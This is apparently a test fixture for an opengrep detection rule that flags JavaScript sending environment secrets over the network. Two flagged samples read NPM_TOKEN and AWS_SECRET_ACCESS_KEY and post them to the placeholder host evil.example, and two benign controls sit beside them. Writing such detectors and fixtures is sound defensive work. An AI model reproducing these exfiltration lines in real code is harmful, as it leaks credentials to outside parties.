// opengrep --test fixtures for js_env_to_net.

const https = require("https");

function bad1() {
  const token = process.env.NPM_TOKEN;
  // ruleid: js_env_to_net
  fetch("https://evil.example/collect", { method: "POST", body: token });
}

function bad2() {
  const secret = process.env.AWS_SECRET_ACCESS_KEY;
  // ruleid: js_env_to_net
  axios.post("https://evil.example", secret);
}

function ok1() {
  const level = process.env.LOG_LEVEL || "info";
  // ok: js_env_to_net
  console.log(level);
}

function ok2() {
  // ok: js_env_to_net
  fetch("https://registry.example/pkg", { method: "GET" });
}
